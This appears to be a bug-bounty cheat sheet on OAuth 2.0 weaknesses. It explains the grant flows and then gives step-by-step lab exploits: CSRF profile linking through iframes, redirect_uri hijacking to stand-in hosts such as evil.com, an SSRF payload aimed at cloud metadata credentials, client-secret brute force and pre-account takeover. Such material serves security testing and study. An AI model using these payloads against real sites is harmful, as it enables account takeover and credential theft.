---
tags:
  - web_hunting
---
### How it is Work 
For example, let’s say website _**https://yourtweetreader.com**_ has functionality to **display all tweets you’ve ever sent**, including private tweets. In order to do this, OAuth 2.0 is introduced. _https://yourtweetreader.com_ will ask you to **authorize their Twitter application to access all your Tweets**. A consent page will pop up on _https://twitter.com_ displaying what **permissions are being requested**, and who the developer requesting it is. Once you authorize the request, _https://yourtweetreader.com_ will be **able to access to your Tweets on behalf of you**.

Elements which are important to understand in an OAuth 2.0 context:

- **resource owner**: The `resource owner` is the **user/entity** granting access to their protected resource, such as their Twitter account Tweets. In this example, this would be **you**.

- **resource server**: The `resource server` is the **server handling authenticated requests** after the application has obtained an `access token` on behalf of the `resource owner` . In this example, this would be **https://twitter.com**

- **client application**: The `client application` is the **application requesting authorization** from the `resource owner`. In this example, this would be **https://yourtweetreader.com**

- **authorization server**: The `authorization server` is the **server issuing** `**access tokens**` to the `client application` **after successfully authenticating** the `resource owner` and obtaining authorization. In the above example, this would be **https://twitter.com**
- **client_id**: The `client_id` is the **identifier for the application**. This is a public, **non-secret** unique identifier.

- **client_secret:** The `client_secret` is a **secret known only to the application and the authorization server**. This is used to generate `access_tokens`

- **response_type**: The `response_type` is a value to detail **which type of token** is being requested, such as `code`

- **scope**: The `scope` is the **requested level of access** the `client application` is requesting from the `resource owner 

- **redirect_uri**: The `redirect_uri` is the **URL the user is redirected to after the authorization is complete**. This usually must match the redirect URL that you have previously registered with the service    

- **state**: The `state` parameter can **persist data between the user being directed to the authorization server and back again**. It’s important that this is a unique value as it serves as a **CSRF protection mechanism** if it contains a unique or random value per request

- **grant_type**: The `grant_type` parameter explains **what the grant type is**, and which token is going to be returned

- **code**: This `code` is the authorization code received from the `authorization server` which will be in the query string parameter “code” in this request. This code is used in conjunction with the `client_id` and `client_secret` by the client application to fetch an `access_token`

- **access_token**: The `access_token` is the **token that the client application uses to make API requests** on behalf of a `resource owner`

- **refresh_token**: The `refresh_token` allows an application to **obtain a new** `**access_token**` **without prompting the user**

### How to differentiate between implicit and authorization code grant type

In OAuth there are 2 types of flows/grant types:
- Authorization code flow
- Implicit flow

>Note: _if the oauth service uses authorization code flow then there is little to no chance of finding a bug but if the oauth service uses implicit flow then there is a good chance of finding bugs_
#### How to differentiate between implicit and authorization code grant type

##### <ins>Authorization code grant type</ins>

1- **Authorization request**
- When you send an authorization request to the oauth service in the client application , The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.

> Note: the endpoint name can be different according to the application like `/auth` etc. but you can identify them based on the parameters used.

- The request in authorization code flow looks like:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

- So, in authorization code grant type the `response_type` parameter should be `code` . this code is used to request access token from the oauth service.

- Now, after the user login to their account with the OAuth provider and gives consent to access their data. the user will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting `GET` request will contain the authorization code as a query parameter.

2- **Authorization code grant**

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

- Rest of the stuff like access token grant and API calls are done in the back-end so you cannot see them in your proxy.

**factors that determine authorization code flow:**
- Initial authorization request has `response_type=code`
- the `/callback` request contains authorization code as a parameter.

##### <ins>Implicit grant type</ins>

**Authorization request**
- The implicit flow starts in pretty much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to `token`.

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

**Access Token grant**

- If the user logs in and gives their consent to the request access , the oauth service redirects the user to the `/callback` endpoint but instead of sending a parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.

```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

**factors that determine Implicit flow:**
- Initial authorization request has `response_type=token`
- the `/callback` request contains access token as a parameter.

---
### **Authentication bypass via OAuth implicit flow**

- To log the user in every time with oauth , the client application sends a POST request to the server containing user info (email-id, username) and access token to generate a session cookie.

- so, find a POST req in http history which contains user-info and access token.

- Usually in implicit flow , the server doesn't validate the access token so you can change the parameters like email-id and/or username to impersonate another user and bypass authentication.

```jsx
    1. Sudy the requests and responses that make up the OAuth flow. This starts from the authorization request "GET /auth?client_id=[...]".
    2. Notice that the client application receives some basic information about the user from the OAuth service. 
    3. It then logs the user in by sending a POST request containing this information to its own "/authenticate" endpoint, along with the acc
    4. Send the "POST /authenticate" request to Burp Repeater. In Repeater, change the email address to "victim@email.net" and send the request. Observe that you do not encounter an error.
    5. Right-click on the POST request and select "Request in browser" > "In original session". Copy this URL and visit it in the browser. You are logged in as Carlos and the lab is solved.
 ```
    

### **Forced OAuth profile linking**
- This is similar to a traditional CSRF attack so the impact may not be that much.
- In this when you sign in with social media profile, you will be redirected to the social media website and then you log in with social media credentials.
- Now the next time when you log in , you will be logged in instantly. capture this request with burp.
- In the http history there would be a request similar to `/auth?client_id[...]` . In that request the redirect_uri sends the authorization code to something like `/oauth-linking`. Check if the `state` parameter is present. if its not present then it is vulnerable to CSRF attacks. because that means there is no way for server to verify if this information is from the same user.
- So absence of `state` parameter in this request is itself a vulnerability.
-  Past this you can try sending the exploit link to the victim and complete the oauth flow by attaching your social media profile to their account.
	- For this copy URL of the request in burp and drop the request so that the code isn't used.
	- Turn off intercept and log out of website.
	- Now you can send this link to the victim or you can set it as an iframe on your website `<iframe src="request URL"></iframe>`. and deliver your website link to the victim.
	- When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the victim account.


    ```jsx
    1. Notice that you have the option to attach your social media profile to your existing account.
    3. notice that when you try to attach your social media account the target redirect you to social media website then go back to the target again
    4. log out from the account and try to login with your social media linked account notice that it redirects you directly to target without any credentials needed
    5. In the "GET /auth?client_id[...]" request, observe that the "redirect_uri" for this functionality sends the authorization code to the endpoint like "/oauth-linking" without "state" parameter
    6. Turn on proxy interception and select the "Attach a social profile"  copy URL from the "GET /oauth-linking?code=[...]" request
    8. Drop the request. This is important to ensure that the code is not used and, therefore, **remains valid**.
    10. in your exploit server : <iframe src="<https://YOUR-TARGET.net/oauth-linking?code=STOLEN-CODE>"></iframe>
    11. Deliver the exploit to the victim. When their browser loads the iframe, it will complete the OAuth flow using your social media profile, attaching it to victim account on the blog website.
    12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the victim user
    ```
### **Insufficient Redirect URI Validation**

The `redirect_uri` is very important because **sensitive data, such as the** `**code**` **is appended to this URL** after authorization. If the `redirect_uri` can be redirected to an **attacker controlled server**, this means the attacker can potentially **takeover a victim’s account** by using the `code` themselves, and gaining access to the victim’s data.

The way this is going to be exploited is going to vary by authorization server. **Some** will **only accept** the exact same `**redirect_uri**` **path as specified in the client application**, but some will **accept anything** in the same domain or subdirectory of the `redirect_uri` .
- Open redirects: [`https://yourtweetreader.com`](https://yourtweetreader.com)`/callback?redirectUrl=https://evil.com`
- Path traversal: `https://yourtweetreader.com/callback/../redirect?url=https://evil.com`
- Weak `redirect_uri` regexes: `https://yourtweetreader.com.evil.com`
- HTML Injection and stealing tokens via referer header: `https://yourtweetreader.com/callback/home/attackerimg.jpg`
- XSS in redirect implementation
	As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
	`https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>`
	
**Other parameters** that can be vulnerable to Open Redirects are:
	- **client_uri** - URL of the home page of the client application
	- **policy_uri** - URL that the Relying Party client application provides so that the end user can read about how their profile data will be used.
	- **tos_uri** - URL that the Relying Party client provides so that the end user can read about the Relying Party's terms of service.
	- **initiate_login_uri** - URI using the https scheme that a third party can use to initiate a login by the RP. Also should be used for client-side redirection
>If you target an OpenID server, the discovery endpoint at **`.well-known/openid-configuration`**sometimes contains parameters such as "_registration_endpoint_", "_request_uri_parameter_supported_", and "_require_request_uri_registration_". These can help you to find the registration endpoint and other server configuration values.

```jsx
    1. login with social account then logout and try login again
    2. notice that you are redirected without any credentials
    3. notice "redirect_uri" vulnerable to open redirect
    ----------------------
    	GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=9ad67f13
    	&redirect_uri=https://attacker.com/ HTTP/1.1
    	Host: oauth.lab
    ----------------
    	GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=9ad67f13
    	&redirect_uri=https://facebook.com/?u=http://evil.com&h=e8989909s HTTP/1.1
    	Host: example.com
    --------------------------------
    4. notice there are /callback?code=auth-callback-code
    5. go to your exploit server and try:
    <iframe src="<https://TARGET-OAUTH-SERVER.net/auth?client_id=CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER.net&response_type=code&scope=openid%20profile%20email>"></iframe>
    
    6. steal the victim code and make request to
    <https://YOUR-Target/oauth-callback?code=STOLEN-CODE>
    
    # References 
    <https://hackerone.com/reports/665651> > Stealing Users OAuth Tokens through redirect_uri parameter
    ```
    
- **SSRF via OpenID dynamic client registration**
    
    ```jsx
    1. try browse <https://TARGET-OAUTH-SERVER.net/.well-known/openid-configuration>
    2. Notice where the client registration endpoint is located example:"/reg"
    3. In Burp Repeater, create a suitable POST request and retrieve registration data like "client_id"
    ----------------------------------------------
    POST /reg
    HTTP/1.1
    Host: TARGET-OAUTH-SERVER.net
    Content-Type: application/json
    { "redirect_uris" : [
     "<https://example.com>" ]
    }
    ---------------------------------------------
    4. Send the GET /client/CLIENT-ID/logo request to Burp Repeater
    5. Go back to "POST /reg" request,Add the "logo_uri" ,test if it's vulnerable to ssrf
    -------------------------------------------------
    POST /reg
    HTTP/1.1
    Host: TARGET-OAUTH-SERVER.net
    Content-Type: application/json
    { "redirect_uris" : [
     "<https://example.com>" ], "logo_uri" :
    "<https://BURP-COLLABORATOR-PAYLOAD>"
    }
    -------------------------------------------------
    6. Try Read meta data files like
       "logo_uri" : "<http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/>"
    ```
    
- **Stealing OAuth access tokens via a proxy page**
    
    ```jsx
    1. try browse <https://TARGET-OAUTH-SERVER.net/.well-known/openid-configuration>
    2. Notice where the client registration endpoint is located example:"/reg"
    3. In Burp Repeater, create a suitable POST request and retrieve registration data like "client_id"
    ----------------------------------------------
    POST /reg
    HTTP/1.1
    Host: TARGET-OAUTH-SERVER.net
    Content-Type: application/json
    { "redirect_uris" : [
     "<https://example.com>" ]
    }
    ---------------------------------------------
    4. Send the GET /client/CLIENT-ID/logo request to Burp Repeater
    5. Go back to "POST /reg" request,Add the "logo_uri" ,test if it's vulnerable to ssrf
    -------------------------------------------------
    POST /reg
    HTTP/1.1
    Host: TARGET-OAUTH-SERVER.net
    Content-Type: application/json
    { "redirect_uris" : [
     "<https://example.com>" ], "logo_uri" :
    "<https://BURP-COLLABORATOR-PAYLOAD>"
    }
    -------------------------------------------------
    6. Try Read meta data files like
       "logo_uri" : "<http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/>"
    ```
### OAUTH Code Flaws
    
```jsx
    1. Can code be reused few times for an hour ?
    2. Can code be brute forced? Is there rate limits?
    3. is code for application X valid for application Y?
    ```
### **Access Token Scope Abuse**
    
 ```python
    <https://www.example.com/admin/oauth/authorize?[>...]&scope=read\\_profile\\
    &redirect_uri=/
    
    If all goes well, you will notice a response that looks something like this:
    
    {
    "access_token": "eyJz93a...k4laUWw",
    "refresh_token": "GEbRxBN...edjnXbL",
    "id_token": "eyJ0XAi...4faeEoQ",
    "token_type": "Bearer"
    
    }
    
    Now use this token to try to access another API endpoint that requires an elevated scope, for example:
    
    <https://www.example.com/api/v2/getCreditCardInfo?access_token=eyJz93a…k4laUWw>
```
### Pre - Account take Over
One of the other more common issues I see is when applications allow “Sign in with X” but also username/password. There are 2 different ways to attack this:
-  If the application does **not require email verification on account creation**, try **creating an account with a victim’s email address and attacker password** before the victim has registered. If the **victim** then tries to register or sign in **with a third party**, such as Google, it’s possible the application will do a lookup, see that email is already registered, then l**ink their Google account to the attacker created account**. This is a “**pre account takeover**” where an attacker will have access to the victim’s account if they created it prior to the victim registering.

-  If an **OAuth app does not require email verification**, try signing up with that OAuth app and then change the email address with a **victim’s email address**. The same issue as above could exist, but you’d be attacking it from the other direction and getting access to the victim’s account for an account takeover

- if target enable self confirmation for email change you can try to change your email to non-registered victim account and then try to login with your old OAUTH
### Disclosure of Secrets
It’s very important to recognize **which of the many OAuth parameters are secret**, and to protect those. For example, leaking the `client_id` is perfectly fine and necessary, but leaking the **`client_secret`**  **is dangerous**. If this is leaked, the **attacker** can potentially **abuse the trust and identity of the trusted client application to steal user** **`access_tokens`** **and private information/access for their integrated accounts**. Going back to our earlier example, one issue I’ve seen is performing this step from the client, instead of the server:

- [_https://yourtweetreader.com_](https://yourtweetreader.com) _will then take that_ _`code`_ _, and using their application’s_ _`client_id`_ _and_ _`client_secret`_ _, will make a request from the server to retrieve an_ _`access_token`_ _on behalf of you, which will allow them to access the permissions you consented to._
- **If this is done from the client, the** `**client_secret**` **will be leaked and users will be able to generate** `**access_tokens**` **on behalf of the application**. With some social engineering, they can also **add more scopes to the OAuth authorization** and it will all appear legitimate as the request will come from the trusted client application.

### Client Secret Brute_Force

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts. The request to BF may look similar to:
```http
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```


### Referrer Header leaking Code + State
Once the client has the **code and state**, if it's **reflected inside the Referrer header** when he browses to a different page, then it's vulnerable.


### Access Token Stored in Browser History
Go to the **browser history and check if the access token is saved in there**.
### Everlasting Authorization Code
The **authorization code should live just for some time to limit the time window where an attacker can steal and use it**.

### Authorization/Refresh Token not bound to client
If you can get the **authorization code and use it with a different client then you can takeover other accounts**.
- **Refresh Token** ->     https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46

### Other Bugs
- **[Race Conditions in OAuth 2 API implementations](https://hackerone.com/reports/55140)**
- **[Misconfigured oauth leads to Pre account takeover](https://hackerone.com/reports/1074047)**
	1. Attacker Creates Account with victim email 
	2. Victim makes account using OAUTH and login
	3. Attacker login with old credentials he made in step1
- **[Oauth Misconfiguration Lead To Account Takeover](https://hackerone.com/reports/1212374)**
- **[Race Conditions in OAuth 2 API implementations](https://hackerone.com/reports/55140)**
- **[XSS on OAuth authorize/authenticate endpoint](https://hackerone.com/reports/87040)**